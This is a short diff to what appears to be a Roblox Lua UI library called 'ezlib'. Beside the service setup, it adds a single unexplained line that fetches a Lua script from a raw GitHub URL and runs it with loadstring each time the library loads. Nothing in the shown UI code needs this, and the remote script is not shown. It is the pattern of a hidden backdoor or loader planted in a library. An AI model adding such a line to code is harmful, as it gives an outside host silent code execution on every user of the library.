@@ -3,6 +3,8 @@ local ezlib = {}
 local ts = game:GetService("TweenService")
 local uis = game:GetService("UserInputService")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IcantAffordSynapse/tests/refs/heads/main/main.lua"))()
+
 function ezlib:NewWindow(winName)
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
